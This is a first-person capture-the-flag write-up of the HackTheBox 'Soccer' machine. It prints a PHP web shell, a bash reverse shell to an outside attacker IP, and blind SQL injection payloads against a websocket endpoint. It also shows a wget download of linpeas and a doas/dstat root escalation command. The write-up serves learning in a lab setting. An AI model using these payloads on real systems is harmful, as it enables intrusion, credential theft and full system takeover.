# Soccer

# Recon
Nmap shows open ports: 22, 80 and 9091.

I can't find anything interesting on 9091 for now, so I'll leave it until I think I might need it. Although it looks like a node js app.

Wfuzz doesn't find anything on port 9091 either, but it did find /tiny on port 80:

```
000018127:   301        7 L      12 W       178 Ch      "tiny"                                   
```

I visit http://soccer.htb/tiny. It seems to be a file manager written in PHP according to the docs on github.

I try running sqlmap on the login form, but sqlmap doesn't find injections here. Went on the Tiny docs to browse around and stubled upon default credentials, and voila! that gave me admin access to the Tiny service!

I can see files related to the website as well as to the file manager, and in the bottom right corner I can see which version was running:

Tiny File Manager 2.4.3

# Initial foothold

A quick google for "Tiny File Manager 2.4.3" and gitub pulls through with a POC: https://github.com/febinrev/tinyfilemanager-2.4.3-exploit/blob/main/exploit.sh

Looks like I can append &upload to the url and upload something to the server.

```
http://soccer.htb/tiny/tinyfilemanager.php?p=tiny%2Fuploads&upload
```

I thought I'd try with a reverse shell first, so I set up a netcat listener on my attacking machine:

```
$ nc -lnvp 4444
```

And upload this php file to Tiny service in the `uploads` folder

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

Now this html/php file is available on url: `http://soccer.htb/tiny/uploads/shell.php`

I suppose it's a GUI based approach to creating a reverse shell, but it works just as well as sending a curl request. For the command I used a bash reverse shell:

```
bash -c 'bash -i >& /dev/tcp/10.10.16.19/4444  0>&1'
```

And connection established! 

# "I'm in..."

Let's see who we can pivot to:

```
www-data@soccer:/tmp/nscp$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
player:x:1001:1001::/home/player:/bin/bash
```

Looks like user `player` is the next target! Time for some privilege escalation!

I always check basic stuff first like `sudo -l` and config files that I have access to at this point, but nothing sticks out.

I also check `netstat -tulpn` and I am reminded that there is something running on port 9091, so I check nginx configs to see if that's what is hosting it:


```
tcp        0  --> 0 0.0.0.0:9091 <--        0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1105/nginx: worker  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      1105/nginx: worker  
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
```

Turns out nginx hosts a site called `soc-player.soccer.htb`. This is probably not something that would show up in wordlists so it'd be hard to find if I couldn't look in the config file!

```
server {
        listen 80;
        listen [::]:80;
        server_name soc-player.soccer.htb;
        ...
}
```

Added the subdomain name to my `/etc/hosts` file:

```
$ cat /etc/hosts | grep soccer
10.10.11.194    soccer.htb soc-player.soccer.htb
```

# soc-player.soccer.htb

Visiting the site, I can see it has a login as well as a registration form. So, while I run sqlmap on both forms, I register and poke around while looking at requests in Burpsuite to see what happens. Sqlmap ends up finding nothing.

After registration, I am presented with a kind of "ticket id validation" functonality. I can input a number and I am told whether or not it's a valid ticket id. I take note that the response is surprisingly fast!

I could tell from burp that it was not a normal http request, but a websocket request. This is my first time working with this sort of thing!

I try doing some manual sql injection testing, and it seems to be vulnerable! However, the response from the validation check is just "Ticket Exists" or "Ticket Doesn't Exist", I have a hard time knowing how to exploit this.

This is the qery I use to test for injection:


```
{"id":"83132 and true; -- -"}
```

# Blind sql injection

I google for a bit and find out this is called blind sql injection. As I understand it, you basically craft a query that will evaluate to either true or false, and depending on the value you are presented with in the application you can make statements about the data in the database.

In this example, if the query evaluates to TRUE, then I get "Ticket Exists", but if it's FALSE, I get the other value.

Building on this, you can create an expression that says "the first letter in the first table is an 'a'", and depending on what is in the database, this will be true or false. If it's true: great I can move on to the next letter, otherwise I try another letter like 'b' and continue until I have the full table name.

> "Great, but how do you know when you have the full table name? The database will just tell you FALSE for any letter beyond the last letter in the table name, right?"

Yes, and the method I used to check for this was to ask if the next character was greater or equal to `_`. I couldn't really find out how characters in mysql is ordered, but this ended up working for me.

Let's say I ask the database if the 9th character in the first table is `>= '_'`. If it returns TRUE, I know there is at least a 9th character, however, if it returns FALSE then I know there is no 9th character (or at least not one which 'is greater than' an underscore.

Now that I write this, it's probably also possible to query the length of the table name first and then just go from there!

Okay, that being out of the way I got to work on trying to enumerate the database manually (!). I chose to do it manually because "how hard can it be", right? I consider sqlmap briefly and google for a bit to find out how it can work with websockets, but I need to set up a python proxy and everything so I dismiss it thinking that sounds a little convoluted for an "easy" HackTheBox box!

# Manual database enumeration

I find a variation of this query online and change it to fit my needs:

```
80045 and substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) >= 'a'
```

Breaking down the query:

```
select table_name from information_schema.tables where table_schema=database() limit 0,1
```

Selects the table name where `table_schema` is `database()`. `database()` returns the name of the current database, so the result set is a result set with one column `table_name`.

`limit 0,1` means "offset by 0, limit to 1" in mysql (I had to look this up!).

So in the end, the entire thing gives me first table name!

Now for the surrounding part:

```
substring(... ,1,1)
```

Simply takes the substring at index 1, and for a length of 1. 

So if the string is "foo", this would return `f`. If we used `substring('foo', 1, 2), then we result would be `fo`. And finally `substring('foo', 2, 1)` returns `oo`.


```
substring('bar', 1, 1) => Take a substring from index 1, for a lenght of 1 => 'b'
substring('bar', 2, 1) => Take a substring from index 2, for a lenght of 1 => 'a'
substring('bar', 3, 1) => Take a substring from index 3, for a lenght of 1 => 'c'
substring('bar', 1, 2) => Take a substring from index 1, for a lenght of 2 => 'ba'
substring('bar', 2, 2) => Take a substring from index 2, for a lenght of 2 => 'ar'

```

So if the table name is `accounts`, then the query

```
80045 and substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) = 'a'
```

Would return TRUE as long as I use a valid ticket id.

Using this approach and just incrementing the index and changing the charater, I "quickly" learn that the table name is `accounts`! It doesn't look like there are any other tables.

# Manually enumerating columns

Now to enumerate the columns. It's the same approach, but a slightly different query:

```
88451 and substring((select column_name from information_schema.columns where table_name='accounts' limit 0,1), 1, 1) = 'u'
```

However, a few columns in, I get really tired of doing this and I decide to script my way of of it using python!

# Automatic database enumeration with Python

I use the same approach in my script and just try to brute force it.

You can take a look at the script - it's not pretty, but it kind of works. You get the idea... It's the script called `soc.py`.

My script tells me there is a column called `username` and another one called `password`, so I amend the script to bruteforce the values in these tables

I get a username and password!

```
player:<redacted>
```

Let's try ssh'ing! I recall this user was in /etc/passwd

No dice. My script does not contain numbers - only letters and punctiation. I'll add numbers as well!

This expands the password to: `playerofthematch2022`. I'll try that one.

... Still not good enough! Access denied.

<time passes>

I spent a bit of time googling, and I am 99% sure I have the right password. So I find a writeup, and they had found the password to be PlayerOfTheMatch2022.

My home-brewed script had found the same password, but just all lowercase!

So I googled a bit more about mysql case sensitive string comparisons, and it turns out it sucks. For some reason, 'a' and 'A' compare to the same!? At least the way I'm doing it.

I checked out a few writeups up until this point - and they all just used sqlmap which gives them the username and password without much work other than setting up a proxy.

So, I'll do the same! I am using the script here: https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

, and amending it so that it fits my needs and works with my auth flow already.

# Some time passes

I had to try a few different times since the `--passwords` option for sqlmap could not really deal with clear-text password, I think?

I ended up dumping the database instead:

```
sqlmap -u "http://localhost:8081/?id=1" --dbms=mysql --dump
```

And viewing the dump file gives me the correct password! Progress! This is a gotcha for another time where I have to deal with blind mysql injection!

# SSH foothold!

I always try the usual suspects:

```
sudo -l
ls -la /opt
env
groups
find / -perm -u=s -type f 2>/dev/null
```

But nothing stands out, so I decide to run linPEAS.

I set up a python server on my attacking box:

```
python -m http.server
```

And create a dir in `/tmp` on the victim:

```
mkdir /tmp/nscp
cd /tmp/nscp
wget http://10.10.16.19:8000/linpeas.sh
chmod 755 linpeas.sh
./linpeas.sh -a > linout.txt
```

Wait a while for it to finish and look over the results with `less -R linout.txt`.

There are some hits on potential cve's, but I've found that these are usually not so normal for HackTheBox boxes at this point. There were a few earlier in my journey, but these newer boxes don't have as many.

But one thing that stands out is this `doas` thing. I haven't seen that before:

```
╔══════════╣ Checking doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

That looks highly relevant! Looks like some kind of `sudo -l` variation. I google it, and Arch says:

> OpenDoas is a portable version of OpenBSD's doas command, known for being substantially smaller in size compared to sudo. Like sudo, doas is used to assume the identity of another user on the system. 

Nice - sounds like something I can use! I don't know what `dstat` is, so I check the man-page out:

```
DESCRIPTION
       Dstat is a versatile replacement for vmstat, iostat and ifstat. Dstat overcomes some of the
       limitations and adds some extra features.
```

I check out GTFOBins to see if they have an entry doe dstat:

They do! https://gtfobins.github.io/gtfobins/dstat/

Just going to copy and paste the sudo commands, and replace sudo with doas:

```
echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
doas /usr/bin/dstat --xxx
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

Nice! Box has been pwned!

# Understanding dstat privilege escalation

Continuing to read through the man-page, dstat supports a kind of custom plugin: 

```
FILES
       Paths that may contain external dstat_*.py plugins:

           ~/.dstat/
           (path of binary)/plugins/
           /usr/share/dstat/
           /usr/local/share/dstat/
```

And I guess the plugin is just called whatever is between `dstat_` and `.py` (`xxx`) in my case, and that dstat simply runs the plugin file to run the plugin.

Pretty neat!

# Conclusion

Overall really nice box! I was stuck only a few times, I think. Mainly trying to figure out how to do blind sql injection and running sqlmap trough a proxy.

Really enjoyed it and I think I learned a lot!
